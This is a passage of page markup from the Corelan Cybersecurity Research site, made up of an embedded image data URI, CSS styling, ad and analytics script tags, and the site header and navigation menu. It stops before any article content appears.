AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAo8P3hwYWNrZXQgZW5kPSJ3Ij8+ZK4pUAAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAABIUlEQVR42qSTsUrEQBCG/8QjCCcWV1gJYm+31ic+gHa2goVcbeMb2PgGcoVgay3YiKDtpbBNpQgWV6i5Iptkx/ktcrcEj0OSG1j4Z4f9dmd2JiCJZayzKBDcblwBMFM35tF40AgApTnZPzYAcP140/wF+AGstV63ABBFUXjdHCBEnucgCcg/gGDYqxfMW1mWHhAMe6M/4Zinn4PO9DZzsHdorLUg6dfM7+/0TX0/DEM8vzzVUhDCOQfnHACArPx0kiLLMgCAEwdqdTiKIp/WDBDfP9zN5be5vWV0RfHx9h7PNwpiD+BZOtckweX6SFYFqgoIwfPJbrNfcIR0pSqia/ONhULXtAIU2gLwLWCXXjcHJJJ8XbxWeoxk4dAtO86/AwCZ86lQjmgAxAAAAABJRU5ErkJggg==)}.stb-container.stb-collapsed .stb-content {padding-bottom: 0;padding-top: 0}.stb-container.stb-no-caption, .stb-container.stb-no-caption.stb-ltr {direction: ltr}.stb-container.stb-no-caption:not(.stb-caption-box) .stb-content,.stb-container.stb-no-caption.stb-ltr:not(.stb-caption-box) .stb-content {padding: 10px 10px 10px 0}.stb-container.stb-no-caption.stb-rtl {direction: rtl}.stb-container.stb-no-caption.stb-rtl:not(.stb-caption-box) .stb-content {padding: 10px 0 10px 10px}
.stb-container.stb-style-alert {color: #000000;border: 1px solid #FF4F4A;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #fDCBC9), color-stop(90%, #FB7D78));background-image: -o-linear-gradient(top, #fDCBC9 30%, #FB7D78 90%);background-image: linear-gradient(180deg, #fDCBC9 30%, #FB7D78 90%);}.stb-container.stb-style-alert .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-alert.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #fDCBC9), color-stop(90%, #FB7D78));background-image: -o-linear-gradient(top, #fDCBC9 30%, #FB7D78 90%);background-image: linear-gradient(180deg, #fDCBC9 30%, #FB7D78 90%);}.stb-container.stb-style-black {color: #FFFFFF;border: 1px solid #6E6E6E;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #3B3B3B), color-stop(90%, #000000));background-image: -o-linear-gradient(top, #3B3B3B 30%, #000000 90%);background-image: linear-gradient(180deg, #3B3B3B 30%, #000000 90%);}.stb-container.stb-style-black .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #4B4747), color-stop(90%, #141414));background-image: -o-linear-gradient(top, #4B4747 30%, #141414 90%);background-image: linear-gradient(180deg, #4B4747 30%, #141414 90%);}.stb-container.stb-style-black.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #3B3B3B), color-stop(90%, #000000));background-image: -o-linear-gradient(top, #3B3B3B 30%, #000000 90%);background-image: linear-gradient(180deg, #3B3B3B 30%, #000000 90%);}.stb-container.stb-style-custom {color: #000000;border: 1px solid #F844EE;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F7CDF5), color-stop(90%, #F77DF1));background-image: -o-linear-gradient(top, #F7CDF5 30%, #F77DF1 90%);background-image: linear-gradient(180deg, #F7CDF5 30%, #F77DF1 90%);}.stb-container.stb-style-custom .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-custom.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F7CDF5), color-stop(90%, #F77DF1));background-image: -o-linear-gradient(top, #F7CDF5 30%, #F77DF1 90%);background-image: linear-gradient(180deg, #F7CDF5 30%, #F77DF1 90%);}.stb-container.stb-style-download {color: #000000;border: 1px solid #65ADFE;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #78C0F7), color-stop(90%, #2E7CB9));background-image: -o-linear-gradient(top, #78C0F7 30%, #2E7CB9 90%);background-image: linear-gradient(180deg, #78C0F7 30%, #2E7CB9 90%);}.stb-container.stb-style-download .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-download.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #78C0F7), color-stop(90%, #2E7CB9));background-image: -o-linear-gradient(top, #78C0F7 30%, #2E7CB9 90%);background-image: linear-gradient(180deg, #78C0F7 30%, #2E7CB9 90%);}.stb-container.stb-style-grey {color: #000000;border: 1px solid #BBBBBB;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #E3E3E3), color-stop(90%, #ABABAB));background-image: -o-linear-gradient(top, #E3E3E3 30%, #ABABAB 90%);background-image: linear-gradient(180deg, #E3E3E3 30%, #ABABAB 90%);}.stb-container.stb-style-grey .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #B5B5B5), color-stop(90%, #6E6E6E));background-image: -o-linear-gradient(top, #B5B5B5 30%, #6E6E6E 90%);background-image: linear-gradient(180deg, #B5B5B5 30%, #6E6E6E 90%);}.stb-container.stb-style-grey.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #E3E3E3), color-stop(90%, #ABABAB));background-image: -o-linear-gradient(top, #E3E3E3 30%, #ABABAB 90%);background-image: linear-gradient(180deg, #E3E3E3 30%, #ABABAB 90%);}.stb-container.stb-style-info {color: #000000;border: 1px solid #7AD975;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #A1EA94), color-stop(90%, #79B06E));background-image: -o-linear-gradient(top, #A1EA94 30%, #79B06E 90%);background-image: linear-gradient(180deg, #A1EA94 30%, #79B06E 90%);}.stb-container.stb-style-info .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-info.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #A1EA94), color-stop(90%, #79B06E));background-image: -o-linear-gradient(top, #A1EA94 30%, #79B06E 90%);background-image: linear-gradient(180deg, #A1EA94 30%, #79B06E 90%);}.stb-container.stb-style-warning {color: #000000;border: 1px solid #FE9A05;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F8FC91), color-stop(90%, #F0D208));background-image: -o-linear-gradient(top, #F8FC91 30%, #F0D208 90%);background-image: linear-gradient(180deg, #F8FC91 30%, #F0D208 90%);}.stb-container.stb-style-warning .stb-caption {color: #FFFFFF;background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #1D1A1A), color-stop(90%, #504848));background-image: -o-linear-gradient(top, #1D1A1A 30%, #504848 90%);background-image: linear-gradient(180deg, #1D1A1A 30%, #504848 90%);}.stb-container.stb-style-warning.stb-no-caption:not(.stb-caption-box) .stb-caption {background-image: -webkit-gradient(linear, left top, left bottom, color-stop(30%, #F8FC91), color-stop(90%, #F0D208));background-image: -o-linear-gradient(top, #F8FC91 30%, #F0D208 90%);background-image: linear-gradient(180deg, #F8FC91 30%, #F0D208 90%);}
</style>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://www.corelan.be/index.php/wp-json/"><link rel="alternate" type="application/json" href="https://www.corelan.be/index.php/wp-json/wp/v2/posts/2114"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.corelan.be/xmlrpc.php?rsd">
<link rel="shortlink" href="https://www.corelan.be/?p=2114">
<link rel="alternate" type="application/json+oembed" href="https://www.corelan.be/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F19%2Fexploit-writing-tutorial-part-1-stack-based-overflows%2F">
<link rel="alternate" type="text/xml+oembed" href="https://www.corelan.be/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.corelan.be%2Findex.php%2F2009%2F07%2F19%2Fexploit-writing-tutorial-part-1-stack-based-overflows%2F&amp;format=xml">
<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({
          google_ad_client: "ca-pub-8134501503628637",
          enable_page_level_ads: true
     });
</script>


<style type="text/css">
div.aka_half {
	float: left;
	overflow: auto;
	width: 45%;
}
div.aka_clear {
	clear: both;
	float: none;
}
</style>
		<meta name="generator" content="Site Kit by Google 1.128.1">	<style>img#wpstats{display:none}</style>
		
<script type="text/javascript">
/* <![CDATA[ */
var thickboxL10n = {"next":"Next &gt;","prev":"&lt; Prev","image":"Image","of":"of","close":"Close","loadingAnimation":"https:\/\/www.corelan.be\/wp-content\/plugins\/auto-thickbox\/images\/loadingAnimation.gif"};
try{convertEntities(thickboxL10n);}catch(e){};;
/* ]]> */
</script>
<link rel="shortcut icon" href="https://www.corelan.be/wp-content/themes/corelan/favicon.ico">
		
<!-- Google AdSense meta tags added by Site Kit -->
<meta name="google-adsense-platform-account" content="ca-host-pub-2644536267352236">
<meta name="google-adsense-platform-domain" content="sitekit.withgoogle.com">
<!-- End Google AdSense meta tags added by Site Kit -->
<style type="text/css">.broken_link, a.broken_link {
	text-decoration: line-through;
}</style>
<!-- Google AdSense snippet added by Site Kit -->
<script type="text/javascript" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8134501503628637&amp;host=ca-host-pub-2644536267352236" crossorigin="anonymous" data-checked-head="true"></script>

<!-- End Google AdSense snippet added by Site Kit -->
<script type="text/javascript" src="https://www.corelan.be/wp-content/themes/corelan/script.js"></script>
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-31176335-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>

<!-- AdSense -->
<script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-8134501503628637",
    enable_page_level_ads: true
  });
</script>
<!-- End AdSense -->


<meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"></head>
<body class="post-template-default single single-post postid-2114 single-format-standard">


<div id="art-main">
    <div class="art-header">
        <div class="art-header-center">
            <div class="art-header-png"></div>
        </div>
    <div class="art-header-wrapper">
    <div class="art-header-inner">
        <div class="art-headerobject"></div>
        <div class="art-logo">
                <h1 id="name-text" class="art-logo-name"><a href="https://www.corelan.be/" data-wpel-link="internal">Corelan Cybersecurity Research</a></h1>
                            <h2 id="slogan-text" class="art-logo-text">:: Knowledge is not an object, it's a flow ::</h2>
                </div>
    </div>
    </div>
    </div>
    <div class="art-sheet">
        <div class="art-sheet-tl"></div>
        <div class="art-sheet-tr"></div>
        <div class="art-sheet-bl"></div>
        <div class="art-sheet-br"></div>
        <div class="art-sheet-tc"></div>
        <div class="art-sheet-bc"></div>
        <div class="art-sheet-cl"></div>
        <div class="art-sheet-cr"></div>
        <div class="art-sheet-cc"></div>
        <div class="art-sheet-body">
            <div class="art-nav">
            	<div class="art-nav-l"></div>
            	<div class="art-nav-r"></div>
            	
<ul class="art-menu">
	<li><a href="https://www.corelan.be" title="Home" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Home</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="https://www.corelan.be/index.php/articles/" title="Articles" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Articles</span></a>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
	<li><a href="/?cat=11" title="Free Tools" data-wpel-link="internal"><span class="l"> </span><span class="r"> </span><span class="t">Free Tools</span></a>
	<ul>
		<li><a href="/index.php/category/active-directory/" title="AD &amp; CS" data-wpel-link="internal">AD &amp; CS</a>
		<ul>
			<li><a href="/index.php/2007/11/18/free-tool-pve-active-directory-disable-users/" title="AD Disable Users" data-wpel-link="internal">AD Disable Users</a>
			</li>
			<li><a href="/index.php/2009/04/10/free-tool-windows-2008-certificate-authority-certificate-list-utility-for-pending-requests-and-about-to-expire-certificates/" title="Certificate List Utility" data-wpel-link="internal">Certificate List Utility</a>
			</li>
			<li><a href="https://www.corelan.be/index.php/my-free-tools/ad-cs/pve-find-ad-user/" title="PVE Find AD User" data-wpel-link="internal">PVE Find AD User</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/category/exchange/" title="Exchange Transport Agents" data-wpel-link="internal">Exchange Transport Agents</a>
		<ul>
			<li><a href="/index.php/2008/07/21/free-tool-attachment-filtering-with-exchange-2007-custom-transport-agent/" title="Attachment filter" data-wpel-link="internal">Attachment filter</a>
			</li>
			<li><a href="/index.php/2009/06/20/exchange-20072010-renaming-attachments-on-the-fly-custom-transport-agent/" title="Attachment rename" data-wpel-link="internal">Attachment rename</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/category/networking/" title="Networking" data-wpel-link="internal">Networking</a>
		<ul>
			<li><a href="https://www.corelan.be/index.php/my-free-tools/networking/cisco-switch-backup-utility/" title="Cisco switch backup utility" data-wpel-link="internal">Cisco switch backup utility</a>
			</li>
			<li><a href="/index.php/2009/01/28/monitoring-your-network-with-powershell/" title="Network monitoring with powershell" data-wpel-link="internal">Network monitoring with powershell</a>
			</li>
			<li><a href="/index.php/2008/09/26/free-tool-pve-tcp-ping-utility/" title="TCP Ping" data-wpel-link="internal">TCP Ping</a>
			</li>
		</ul>
		</li>
		<li><a href="/index.php/category/security/" title="Security Related Tools" data-wpel-link="internal">Security Related Tools</a>
		</li>
	</ul>
	</li>
	<li class="art-menu-li-separator"><span class="art-menu-separator"> </span></li>
